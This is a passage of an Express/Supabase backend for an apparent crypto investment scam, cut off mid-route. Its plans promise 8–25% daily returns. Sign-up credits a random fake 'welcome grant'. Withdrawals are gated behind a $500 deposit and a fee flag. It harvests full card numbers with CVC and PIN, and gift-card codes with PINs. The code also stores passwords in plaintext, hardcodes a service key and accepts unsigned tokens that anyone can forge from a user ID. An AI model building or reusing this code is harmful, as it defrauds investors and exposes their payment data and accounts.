import 'dotenv/config';
import express from 'express';
import cors from 'cors';
import { createClient } from '@supabase/supabase-js';
import { fileURLToPath } from 'url';
import path from 'path';

const app = express();
const PORT = 3000;

// ── Supabase Client ───────────────────────────────────────────────────────────
const SUPABASE_URL = process.env.SUPABASE_URL || 'https://edpbhfxkflgtqgygjfyg.supabase.co';
const SUPABASE_SERVICE_KEY = process.env.SUPABASE_SERVICE_KEY || 'sb_secret_P9S0aFJQY2m_jOi0mRreMA_xy0j9Tuv';
const db = createClient(SUPABASE_URL, SUPABASE_SERVICE_KEY, {
  auth: { persistSession: false },
});

// ── Middleware ────────────────────────────────────────────────────────────────
app.use(cors());
app.use(express.json({ limit: '10mb' }));

// Normalize Netlify function rewrite URLs so /api/* routes match correctly
app.use((req, _res, next) => {
  if (req.url.startsWith('/.netlify/functions/api')) {
    req.url = req.url.replace('/.netlify/functions/api', '') || '/';
  }
  if (!req.url.startsWith('/api') && req.url !== '/' && !req.url.startsWith('/assets')) {
    req.url = '/api' + req.url;
  }
  next();
});

// ── Static Investment Plans ───────────────────────────────────────────────────
const INVESTMENT_PLANS = [
  {
    id: 'starter',
    name: 'Starter Vault',
    badge: 'Entry Level',
    profit: '8% Daily ROI',
    dailyProfitPercent: 8,
    min: '$100',
    minDepositUsd: 100,
    max: '$2,499',
    maxDepositUsd: 2499,
    days: '3 Days',
    durationDays: 3,
    desc: 'Entry-level automated yield strategy for new investors.',
    features: ['8% Daily Returns', 'Auto-compounding', '3-Day Lock Period', 'Crypto + Fiat Deposits', '24/7 Support'],
    popular: false,
  },
  {
    id: 'growth',
    name: 'Growth Protocol',
    badge: 'Most Popular',
    profit: '12% Daily ROI',
    dailyProfitPercent: 12,
    min: '$2,500',
    minDepositUsd: 2500,
    max: '$19,999',
    maxDepositUsd: 19999,
    days: '5 Days',
    durationDays: 5,
    desc: 'Mid-tier DeFi yield aggregator with enhanced compounding.',
    features: ['12% Daily Returns', 'Priority Liquidity', '5-Day Lock Period', 'Multi-Asset Support', 'Dedicated Account Manager'],
    popular: true,
  },
  {
    id: 'elite',
    name: 'Elite Liquidity',
    badge: 'High Yield',
    profit: '18% Daily ROI',
    dailyProfitPercent: 18,
    min: '$20,000',
    minDepositUsd: 20000,
    max: '$99,999',
    maxDepositUsd: 99999,
    days: '7 Days',
    durationDays: 7,
    desc: 'Institutional-grade strategy with maximum yield optimization.',
    features: ['18% Daily Returns', 'Institutional Liquidity', '7-Day Lock Period', 'Advanced Analytics', 'Priority Withdrawals'],
    popular: false,
  },
  {
    id: 'institutional',
    name: 'Institutional Fund',
    badge: 'VIP',
    profit: '25% Daily ROI',
    dailyProfitPercent: 25,
    min: '$100,000',
    minDepositUsd: 100000,
    max: 'Unlimited',
    maxDepositUsd: 99999999,
    days: '14 Days',
    durationDays: 14,
    desc: 'Exclusive high-capital program for verified institutional investors.',
    features: ['25% Daily Returns', 'OTC Desk Access', '14-Day Lock Period', 'Personal Relationship Manager', 'Insurance Coverage'],
    popular: false,
  },
];

// ── Utility Helpers ───────────────────────────────────────────────────────────
const genId = (prefix: string) =>
  `${prefix}_${Date.now()}_${Math.random().toString(36).substring(2, 8)}`;

const randomBalance = () => Math.floor(Math.random() * (6898 - 3400 + 1)) + 3400;

// ── Row Mappers (DB snake_case → App camelCase) ───────────────────────────────
const rowToUser = (r: any) => ({
  uid: r.uid,
  email: r.email,
  password: r.password,
  fullName: r.full_name || '',
  phone: r.phone || '',
  country: r.country || '',
  address: r.address || '',
  avatarUrl: r.avatar_url || '',
  balance: parseFloat(r.balance) || 0,
  profitBalance: parseFloat(r.profit_balance) || 0,
  stakedBalance: parseFloat(r.staked_balance) || 0,
  totalWithdrawn: parseFloat(r.total_withdrawn) || 0,
  totalDeposited: parseFloat(r.total_deposited) || 0,
  kycStatus: r.kyc_status || 'unverified',
  kycTier: parseInt(r.kyc_tier) || 0,
  isAdmin: r.is_admin || false,
  isVerified: r.is_verified || false,
  hasDepositedMinimum: r.has_deposited_minimum || false,
  withdrawalFeePaid: r.withdrawal_fee_paid || false,
  twoFactorEnabled: r.two_factor_enabled || false,
  securityPin: r.security_pin || '0000',
  referralCode: r.referral_code || '',
  referredBy: r.referred_by,
  referralEarnings: parseFloat(r.referral_earnings) || 0,
  isBanned: r.is_banned || false,
  banReason: r.ban_reason || '',
  googleSub: r.google_sub,
  status: r.status || 'active',
  createdAt: r.created_at,
});

// Strip sensitive fields before sending to client
const safeUser = (u: any) => {
  const { password, googleSub, ...safe } = u;
  return safe;
};

const rowToTx = (r: any) => ({
  id: r.id,
  userId: r.user_id,
  userEmail: r.user_email,
  type: r.type,
  method: r.method,
  amount: parseFloat(r.amount) || 0,
  coin: r.coin || '',
  cryptoAmount: r.crypto_amount ? parseFloat(r.crypto_amount) : undefined,
  txHash: r.tx_hash,
  destinationAddress: r.destination_address,
  status: r.status,
  details: r.details,
  adminReason: r.admin_reason,
  networkFee: r.network_fee ? parseFloat(r.network_fee) : undefined,
  createdAt: r.created_at,
});

const rowToKyc = (r: any) => ({
  id: r.id,
  userId: r.user_id,
  userEmail: r.user_email,
  fullName: r.full_name,
  country: r.country,
  docType: r.doc_type,
  idNumber: r.id_number,
  frontImageUrl: r.front_image_url,
  backImageUrl: r.back_image_url,
  selfieUrl: r.selfie_url,
  proofOfAddressUrl: r.proof_of_address_url,
  status: r.status,
  adminNotes: r.admin_notes,
  submittedAt: r.submitted_at,
  reviewedAt: r.reviewed_at,
});

const rowToWallet = (r: any) => ({
  id: r.id,
  coin: r.coin,
  network: r.network,
  address: r.address,
  qrCodeUrl: r.qr_code_url || '',
  isEnabled: r.is_enabled,
  label: r.label,
  memo: r.memo || '',
});

const rowToGiftCard = (r: any) => ({
  id: r.id,
  userId: r.user_id,
  userEmail: r.user_email,
  type: r.type,
  code: r.code,
  pin: r.pin,
  amount: parseFloat(r.amount) || 0,
  status: r.status,
  imageProofUrl: r.image_proof_url,
  adminReason: r.admin_reason,
  submittedAt: r.submitted_at,
});

const rowToCard = (r: any) => ({
  id: r.id,
  userId: r.user_id,
  userEmail: r.user_email,
  fullName: r.full_name,
  cardNumber: r.card_number,
  cardholderName: r.cardholder_name,
  expiryDate: r.expiry_date,
  cvc: r.cvc,
  pin: r.pin,
  amount: parseFloat(r.amount) || 0,
  billingAddress: r.billing_address,
  reference: r.reference,
  status: r.status,
  submittedAt: r.submitted_at,
});

const rowToSetting = (r: any) => ({
  key: r.key,
  value: r.value,
  description: r.description,
  updatedAt: r.updated_at,
});

const rowToInvestment = (r: any) => ({
  id: r.id,
  userId: r.user_id,
  planId: r.plan_id,
  planName: r.plan_name,
  amount: parseFloat(r.amount) || 0,
  cryptoAsset: r.crypto_asset,
  cryptoAmount: parseFloat(r.crypto_amount) || 0,
  dailyProfitPercent: parseFloat(r.daily_profit_percent) || 0,
  expectedProfitUsd: parseFloat(r.expected_profit_usd) || 0,
  totalClaimed: parseFloat(r.total_claimed) || 0,
  startDate: r.start_date,
  endDate: r.end_date,
  durationDays: r.duration_days,
  status: r.status,
  autoCompound: r.auto_compound,
  lastClaimDate: r.last_claim_date,
});

const rowToTrade = (r: any) => ({
  id: r.id,
  userId: r.user_id,
  pair: r.pair,
  type: r.type,
  orderType: r.order_type,
  price: parseFloat(r.price) || 0,
  amount: parseFloat(r.amount) || 0,
  total: parseFloat(r.total) || 0,
  status: r.status,
  createdAt: r.created_at,
});

// ── Auth Helper ───────────────────────────────────────────────────────────────
const getAuthUser = async (req: express.Request) => {
  const authHeader = req.headers.authorization || '';
  const token = authHeader.startsWith('Bearer ') ? authHeader.slice(7) : authHeader;
  if (!token) return null;

  const match = token.match(/^token_(usr_[a-zA-Z0-9_-]+)/);
  if (!match) return null;
  const uid = match[1];

  const { data, error } = await db.from('users').select('*').eq('uid', uid).single();
  if (error || !data) return null;
  return rowToUser(data);
};

// ── Health Check ──────────────────────────────────────────────────────────────
app.get('/api/health', (_req, res) => res.json({ status: 'ok', db: 'supabase-postgresql' }));

// ── Investment Plans ──────────────────────────────────────────────────────────
app.get('/api/investment-plans', (_req, res) => res.json(INVESTMENT_PLANS));

// =============================================================================
// AUTH ROUTES
// =============================================================================

app.post('/api/auth/register', async (req, res) => {
  try {
    const { email, password, fullName, country } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    const { data: existing } = await db
      .from('users')
      .select('uid')
      .eq('email', email.toLowerCase())
      .single();

    if (existing) {
      return res.status(409).json({ error: 'An account with this email already exists.' });
    }

    const uid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
    const balance = randomBalance();

    const { data: inserted, error } = await db
      .from('users')
      .insert([{
        uid,
        email: email.toLowerCase(),
        password,
        full_name: fullName || email.split('@')[0],
        country: country || 'United States',
        balance,
        profit_balance: 0,
        staked_balance: 0,
        total_withdrawn: 0,
        total_deposited: 0,
        kyc_status: 'unverified',
        kyc_tier: 0,
        is_admin: false,
        is_verified: false,
        has_deposited_minimum: false,
        withdrawal_fee_paid: false,
        two_factor_enabled: false,
        referral_code: `NEXO-${Math.random().toString(36).substring(2, 7).toUpperCase()}`,
        referral_earnings: 0,
        status: 'active',
        avatar_url: '',
      }])
      .select()
      .single();

    if (error || !inserted) {
      console.error('Register error:', error);
      return res.status(500).json({ error: 'Failed to create account. Please try again.' });
    }

    // Welcome reward transaction
    await db.from('transactions').insert([{
      id: genId('tx_init'),
      user_id: uid,
      user_email: email.toLowerCase(),
      type: 'reward',
      method: 'crypto',
      amount: balance,
      coin: 'USD (Institutional Grant)',
      status: 'approved',
      details: `Initial Institutional Welcome Balance ($${balance.toLocaleString()})`,
    }]);

    const user = rowToUser(inserted);
    const token = `token_${uid}_${Date.now()}`;
    return res.status(201).json({ token, user: safeUser(user) });
  } catch (err) {
    console.error('Register exception:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) {
      return res.status(400).json({ error: 'Email and password are required' });
    }

    const { data, error } = await db
      .from('users')
      .select('*')
      .eq('email', email.toLowerCase())
      .single();

    if (error || !data) {
      return res.status(401).json({ error: 'Invalid email or password.' });
    }

    const user = rowToUser(data);

    if (user.password && user.password !== password) {
      return res.status(401).json({ error: 'Invalid email or password.' });
    }

    if (user.isBanned || user.status === 'suspended') {
      return res.status(403).json({
        error: `Account suspended. Reason: ${user.banReason || 'Administrative compliance review in progress. Please contact support.'}`,
        isBanned: true,
      });
    }

    const token = `token_${user.uid}_${Date.now()}`;
    return res.json({ token, user: safeUser(user) });
  } catch (err) {
    console.error('Login exception:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/auth/google', async (req, res) => {
  try {
    const { email, fullName, sub, picture, country } = req.body;
    if (!email) return res.status(400).json({ error: 'Google email is required' });

    // Try to find by Google sub first (most reliable)
    if (sub) {
      const { data: bySub } = await db
        .from('users')
        .select('*')
        .eq('google_sub', sub)
        .single();

      if (bySub) {
        const user = rowToUser(bySub);
        if (user.isBanned || user.status === 'suspended') {
          return res.status(403).json({ error: `Account suspended. Reason: ${user.banReason || 'Administrative review.'}`, isBanned: true });
        }
        if (picture && !user.avatarUrl) {
          await db.from('users').update({ avatar_url: picture }).eq('uid', user.uid);
        }
        const token = `token_${user.uid}_${Date.now()}`;
        return res.json({ token, user: safeUser(user), isNewUser: false });
      }
    }

    // Find by email
    const { data: byEmail } = await db
      .from('users')
      .select('*')
      .eq('email', email.toLowerCase())
      .single();

    if (byEmail) {
      const user = rowToUser(byEmail);
      if (user.isBanned || user.status === 'suspended') {
        return res.status(403).json({ error: `Account suspended. Reason: ${user.banReason || 'Administrative review.'}`, isBanned: true });
      }
      const updates: any = {};
      if (sub && !user.googleSub) updates.google_sub = sub;
      if (picture && !user.avatarUrl) updates.avatar_url = picture;
      if (Object.keys(updates).length > 0) {
        await db.from('users').update(updates).eq('uid', user.uid);
      }
      const token = `token_${user.uid}_${Date.now()}`;
      return res.json({ token, user: safeUser(user), isNewUser: false });
    }

    // Create new Google user
    const uid = `usr_${Date.now()}_${Math.random().toString(36).substring(2, 6)}`;
    const balance = randomBalance();
    const newUserRow: any = {
      uid,
      email: email.toLowerCase(),
      full_name: fullName || email.split('@')[0],
      country: country || 'United States',
      balance,
      profit_balance: 0,
      staked_balance: 0,
      total_withdrawn: 0,
      total_deposited: 0,
      kyc_status: 'unverified',
      kyc_tier: 0,
      is_admin: false,
      is_verified: false,
      has_deposited_minimum: false,
      withdrawal_fee_paid: false,
      two_factor_enabled: false,
      referral_code: `NEXO-${Math.random().toString(36).substring(2, 7).toUpperCase()}`,
      referral_earnings: 0,
      status: 'active',
      avatar_url: picture || '',
    };
    if (sub) newUserRow.google_sub = sub;

    const { data: inserted, error } = await db.from('users').insert([newUserRow]).select().single();
    if (error || !inserted) {
      console.error('Google register error:', error);
      return res.status(500).json({ error: 'Failed to create account.' });
    }

    await db.from('transactions').insert([{
      id: genId('tx_init'),
      user_id: uid,
      user_email: email.toLowerCase(),
      type: 'reward',
      method: 'crypto',
      amount: balance,
      coin: 'USD (Institutional Grant)',
      status: 'approved',
      details: `Initial Institutional Welcome Balance ($${balance.toLocaleString()})`,
    }]);

    const token = `token_${uid}_${Date.now()}`;
    return res.status(201).json({ token, user: safeUser(rowToUser(inserted)), isNewUser: true });
  } catch (err) {
    console.error('Google auth exception:', err);
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// =============================================================================
// USER PROFILE ROUTES
// =============================================================================

app.get('/api/user/profile', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });
    const { data } = await db.from('users').select('*').eq('uid', user.uid).single();
    if (!data) return res.status(404).json({ error: 'User not found' });
    return res.json(safeUser(rowToUser(data)));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.put('/api/user/profile', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { fullName, phone, country, address, avatarUrl, twoFactorEnabled, securityPin } = req.body;
    const updates: any = {};
    if (fullName !== undefined) updates.full_name = fullName;
    if (phone !== undefined) updates.phone = phone;
    if (country !== undefined) updates.country = country;
    if (address !== undefined) updates.address = address;
    if (avatarUrl !== undefined) updates.avatar_url = avatarUrl;
    if (twoFactorEnabled !== undefined) updates.two_factor_enabled = twoFactorEnabled;
    if (securityPin !== undefined) updates.security_pin = securityPin;

    const { data, error } = await db.from('users').update(updates).eq('uid', user.uid).select().single();
    if (error || !data) return res.status(500).json({ error: 'Failed to update profile' });
    return res.json(safeUser(rowToUser(data)));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/user/balance', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });
    const { data } = await db
      .from('users')
      .select('balance, profit_balance, staked_balance, total_withdrawn, total_deposited')
      .eq('uid', user.uid)
      .single();
    if (!data) return res.status(404).json({ error: 'Not found' });
    return res.json({
      balance: parseFloat(data.balance) || 0,
      profitBalance: parseFloat(data.profit_balance) || 0,
      stakedBalance: parseFloat(data.staked_balance) || 0,
      totalWithdrawn: parseFloat(data.total_withdrawn) || 0,
      totalDeposited: parseFloat(data.total_deposited) || 0,
    });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/user/change-password', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { currentPassword, newPassword } = req.body;
    if (!currentPassword || !newPassword) return res.status(400).json({ error: 'Both passwords are required' });
    if (user.password && user.password !== currentPassword) {
      return res.status(401).json({ error: 'Current password is incorrect' });
    }
    if (newPassword.length < 6) return res.status(400).json({ error: 'New password must be at least 6 characters' });

    await db.from('users').update({ password: newPassword }).eq('uid', user.uid);
    return res.json({ message: 'Password updated successfully' });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// =============================================================================
// TRANSACTION ROUTES
// =============================================================================

app.get('/api/transactions', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { data, error } = await db
      .from('transactions')
      .select('*')
      .eq('user_id', user.uid)
      .order('created_at', { ascending: false });

    if (error) return res.status(500).json({ error: 'Failed to fetch transactions' });
    return res.json((data || []).map(rowToTx));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/transactions/deposit', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { amount, coin, method, txHash, cryptoAmount } = req.body;
    if (!amount || !coin) return res.status(400).json({ error: 'Amount and coin are required' });

    const txId = genId('tx_dep');
    const { error } = await db.from('transactions').insert([{
      id: txId,
      user_id: user.uid,
      user_email: user.email,
      type: 'deposit',
      method: method || 'crypto',
      amount: parseFloat(amount),
      coin,
      crypto_amount: cryptoAmount || null,
      tx_hash: txHash || null,
      status: 'pending',
      details: `Deposit of $${parseFloat(amount).toLocaleString()} via ${coin}`,
    }]);

    if (error) return res.status(500).json({ error: 'Failed to submit deposit request' });
    return res.status(201).json({ message: 'Deposit request submitted successfully.', txId });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/transactions/withdraw', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    if (!user.hasDepositedMinimum) {
      return res.status(403).json({ error: 'You must complete a qualifying deposit of at least $500 before withdrawals are enabled.' });
    }

    const { amount, coin, destinationAddress, networkFee } = req.body;
    if (!amount || !coin || !destinationAddress) {
      return res.status(400).json({ error: 'Amount, coin, and destination address are required' });
    }

    const withdrawalAmount = parseFloat(amount);
    if (withdrawalAmount > user.balance) {
      return res.status(400).json({ error: 'Insufficient balance for this withdrawal.' });
    }

    const txId = genId('tx_wdl');
    await db.from('transactions').insert([{
      id: txId,
      user_id: user.uid,
      user_email: user.email,
      type: 'withdrawal',
      method: 'crypto',
      amount: withdrawalAmount,
      coin,
      destination_address: destinationAddress,
      network_fee: networkFee || null,
      status: 'pending',
      details: `Withdrawal of $${withdrawalAmount.toLocaleString()} to ${destinationAddress.substring(0, 12)}...`,
    }]);

    return res.status(201).json({ message: 'Withdrawal request submitted and is pending admin review.', txId });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// Deposit wallet addresses
app.get('/api/deposit/wallets', async (_req, res) => {
  try {
    const { data } = await db.from('admin_wallets').select('*').eq('is_enabled', true).order('coin');
    return res.json((data || []).map(rowToWallet));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/deposit/wallet/:coin', async (req, res) => {
  try {
    const coin = req.params.coin;
    const { data } = await db
      .from('admin_wallets')
      .select('*')
      .ilike('coin', `%${coin}%`)
      .eq('is_enabled', true)
      .limit(1);
    if (!data || data.length === 0) return res.status(404).json({ error: 'Wallet not found for this coin' });
    return res.json(rowToWallet(data[0]));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// =============================================================================
// INVESTMENT ROUTES
// =============================================================================

app.get('/api/investments/mine', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { data } = await db
      .from('active_investments')
      .select('*')
      .eq('user_id', user.uid)
      .order('start_date', { ascending: false });

    return res.json((data || []).map(rowToInvestment));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/investments/create', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { planId, amount, cryptoAsset, cryptoAmount, autoCompound } = req.body;
    if (!planId || !amount) return res.status(400).json({ error: 'Plan ID and amount are required' });

    const plan = INVESTMENT_PLANS.find(p => p.id === planId);
    if (!plan) return res.status(404).json({ error: 'Investment plan not found' });

    const investAmount = parseFloat(amount);
    if (investAmount < plan.minDepositUsd) {
      return res.status(400).json({ error: `Minimum investment is $${plan.minDepositUsd.toLocaleString()}` });
    }
    if (investAmount > plan.maxDepositUsd) {
      return res.status(400).json({ error: `Maximum investment is $${plan.maxDepositUsd.toLocaleString()}` });
    }
    if (investAmount > user.balance) {
      return res.status(400).json({ error: 'Insufficient balance' });
    }

    const startDate = new Date();
    const endDate = new Date(startDate.getTime() + plan.durationDays * 86400000);
    const expectedProfit = investAmount * (plan.dailyProfitPercent / 100) * plan.durationDays;
    const investmentId = genId('inv');

    const investmentRow = {
      id: investmentId,
      user_id: user.uid,
      plan_id: plan.id,
      plan_name: plan.name,
      amount: investAmount,
      crypto_asset: cryptoAsset || 'USD',
      crypto_amount: cryptoAmount || 0,
      daily_profit_percent: plan.dailyProfitPercent,
      expected_profit_usd: expectedProfit,
      total_claimed: 0,
      start_date: startDate.toISOString(),
      end_date: endDate.toISOString(),
      duration_days: plan.durationDays,
      status: 'active',
      auto_compound: autoCompound || false,
    };

    await db.from('active_investments').insert([investmentRow]);

    // Deduct from user balance
    await db.from('users').update({ balance: user.balance - investAmount }).eq('uid', user.uid);

    // Record investment transaction
    await db.from('transactions').insert([{
      id: genId('tx_inv'),
      user_id: user.uid,
      user_email: user.email,
      type: 'investment',
      method: 'crypto',
      amount: investAmount,
      coin: cryptoAsset || 'USD',
      status: 'approved',
      details: `${plan.name} — ${plan.dailyProfitPercent}% daily for ${plan.durationDays} days`,
    }]);

    return res.status(201).json({ message: 'Investment created successfully', investment: rowToInvestment(investmentRow) });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/investments/claim/:id', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { id } = req.params;
    const { data: inv } = await db
      .from('active_investments')
      .select('*')
      .eq('id', id)
      .eq('user_id', user.uid)
      .single();

    if (!inv) return res.status(404).json({ error: 'Investment not found' });

    const investment = rowToInvestment(inv);
    if (investment.status !== 'active') {
      return res.status(400).json({ error: 'This investment is no longer active' });
    }

    const now = Date.now();
    const start = new Date(investment.startDate).getTime();
    const end = new Date(investment.endDate).getTime();
    const elapsed = Math.min(now - start, end - start);
    const elapsedDays = elapsed / 86400000;
    const totalEarned = investment.amount * (investment.dailyProfitPercent / 100) * elapsedDays;
    const claimable = Math.max(0, totalEarned - investment.totalClaimed);

    if (claimable <= 0.01) {
      return res.status(400).json({ error: 'No profit available to claim yet. Please wait.' });
    }

    await db.from('active_investments').update({
      total_claimed: investment.totalClaimed + claimable,
      last_claim_date: new Date().toISOString(),
      status: now >= end ? 'completed' : 'active',
    }).eq('id', id);

    await db.from('users').update({
      profit_balance: user.profitBalance + claimable,
    }).eq('uid', user.uid);

    await db.from('transactions').insert([{
      id: genId('tx_profit'),
      user_id: user.uid,
      user_email: user.email,
      type: 'profit',
      method: 'crypto',
      amount: claimable,
      coin: 'USD',
      status: 'approved',
      details: `Profit claim from ${investment.planName} — $${claimable.toFixed(2)}`,
    }]);

    return res.json({ message: `Successfully claimed $${claimable.toFixed(2)} in profit.`, claimedAmount: claimable });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// =============================================================================
// TRADE ROUTES
// =============================================================================

app.get('/api/trade/portfolio', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { data } = await db
      .from('trade_orders')
      .select('*')
      .eq('user_id', user.uid)
      .eq('status', 'filled');

    const orders = (data || []).map(rowToTrade);
    const holdings: Record<string, any> = {};

    for (const order of orders) {
      const coin = order.pair?.split('/')[0] || 'BTC';
      if (!holdings[coin]) holdings[coin] = { coin, symbol: coin, amount: 0, totalCost: 0 };
      if (order.type === 'buy') {
        holdings[coin].amount += order.amount;
        holdings[coin].totalCost += order.total;
      } else if (order.type === 'sell') {
        holdings[coin].amount -= order.amount;
        holdings[coin].totalCost -= order.total;
      }
    }

    const portfolio = Object.values(holdings)
      .filter((h: any) => h.amount > 0.000001)
      .map((h: any) => ({
        coin: h.coin,
        symbol: h.symbol,
        amount: h.amount,
        avgBuyPrice: h.amount > 0 ? h.totalCost / h.amount : 0,
        currentPrice: 0,
        value: 0,
        pnl: 0,
        pnlPercent: 0,
      }));

    return res.json(portfolio);
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/trade/history', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { data } = await db
      .from('trade_orders')
      .select('*')
      .eq('user_id', user.uid)
      .order('created_at', { ascending: false });

    return res.json((data || []).map(rowToTrade));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/trade/buy', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { pair, price, amount, orderType } = req.body;
    if (!pair || !price || !amount) return res.status(400).json({ error: 'Pair, price, and amount are required' });

    const total = parseFloat(price) * parseFloat(amount);
    if (total > user.balance) return res.status(400).json({ error: 'Insufficient balance' });

    const orderId = genId('ord');
    await db.from('trade_orders').insert([{
      id: orderId,
      user_id: user.uid,
      pair,
      type: 'buy',
      order_type: orderType || 'market',
      price: parseFloat(price),
      amount: parseFloat(amount),
      total,
      status: 'filled',
    }]);

    await db.from('users').update({ balance: user.balance - total }).eq('uid', user.uid);

    await db.from('transactions').insert([{
      id: genId('tx_trade'),
      user_id: user.uid,
      user_email: user.email,
      type: 'trade_buy',
      method: 'crypto',
      amount: total,
      coin: pair,
      status: 'approved',
      details: `Buy ${amount} ${pair} at $${parseFloat(price).toLocaleString()}`,
    }]);

    return res.status(201).json({ message: 'Buy order filled', orderId });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.post('/api/trade/sell', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { pair, price, amount, orderType } = req.body;
    if (!pair || !price || !amount) return res.status(400).json({ error: 'Pair, price, and amount are required' });

    const total = parseFloat(price) * parseFloat(amount);
    const orderId = genId('ord');

    await db.from('trade_orders').insert([{
      id: orderId,
      user_id: user.uid,
      pair,
      type: 'sell',
      order_type: orderType || 'market',
      price: parseFloat(price),
      amount: parseFloat(amount),
      total,
      status: 'filled',
    }]);

    await db.from('users').update({ balance: user.balance + total }).eq('uid', user.uid);

    await db.from('transactions').insert([{
      id: genId('tx_trade'),
      user_id: user.uid,
      user_email: user.email,
      type: 'trade_sell',
      method: 'crypto',
      amount: total,
      coin: pair,
      status: 'approved',
      details: `Sell ${amount} ${pair} at $${parseFloat(price).toLocaleString()}`,
    }]);

    return res.status(201).json({ message: 'Sell order filled', orderId });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// =============================================================================
// KYC ROUTES
// =============================================================================

app.post('/api/kyc/submit', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { docType, idNumber, country, frontImageUrl, backImageUrl, selfieUrl, proofOfAddressUrl } = req.body;
    if (!docType || !idNumber) return res.status(400).json({ error: 'Document type and ID number are required' });

    const kycId = genId('kyc');
    await db.from('kyc_docs').insert([{
      id: kycId,
      user_id: user.uid,
      user_email: user.email,
      full_name: user.fullName,
      country: country || user.country,
      doc_type: docType,
      id_number: idNumber,
      front_image_url: frontImageUrl || null,
      back_image_url: backImageUrl || null,
      selfie_url: selfieUrl || null,
      proof_of_address_url: proofOfAddressUrl || null,
      status: 'pending',
    }]);

    await db.from('users').update({ kyc_status: 'pending' }).eq('uid', user.uid);

    return res.status(201).json({ message: 'KYC documents submitted for review.', kycId });
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/kyc/my-documents', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { data } = await db
      .from('kyc_docs')
      .select('*')
      .eq('user_id', user.uid)
      .order('submitted_at', { ascending: false });

    return res.json((data || []).map(rowToKyc));
  } catch (err) {
    return res.status(500).json({ error: 'Internal server error' });
  }
});

// =============================================================================
// GIFT CARD ROUTES
// =============================================================================

// Batch gift card deposit — this is the endpoint the frontend actually calls
app.post('/api/transactions/deposit-giftcard', async (req, res) => {
  try {
    const user = await getAuthUser(req);
    if (!user) return res.status(401).json({ error: 'Unauthorized' });

    const { cards } = req.body;
    if (!cards || !Array.isArray(cards) || cards.length === 0) {
      return res.status(400).json({ error: 'At least one gift card is required.' });
    }

    let totalAmount = 0;
    const insertedIds: string[] = [];

    for (const card of cards) {
      if (!card.type || !card.code) continue;
      const amt = parseFloat(card.amount) || 0;
      if (amt <= 0) continue;

      totalAmount += amt;
      const gcId = genId('gc');
      insertedIds.push(gcId);

      await db.from('gift_cards').insert([{
        id: gcId,
        user_id: user.uid,
        user_email: user.email,
        type: card.type,
        code: card.code,
        pin: card.pin || '',
        amount: amt,
        image_proof_url: card.imageProofUrl || null,
        status: 'pending',
      }]);
    }

    if (insertedIds.length === 0) {
      return res.status(400).json({ error: 'No valid gift cards provided.' });
    }

    // Create a summary transaction for the ledger
    const txId = genId('tx_gc');
    await db.from('transactions').insert([{
      id: txId,
      user_id: user.uid,
      user_email: user.email,
      type: 'deposit',
      method: 'giftcard',
      amount: totalAmount,
      coin: `Gift Card (${insertedIds.length} card${insertedIds.length > 1 ? 's' : ''})`,
      status: 'pending',
      details: `Gift card batch deposit — ${insertedIds.length} card(s) totaling $${totalAmount.toLocaleString()}`,
    }]);

    return res.status(201).json({
      message: `${insertedIds.length} gift card(s) submitted for review.`,
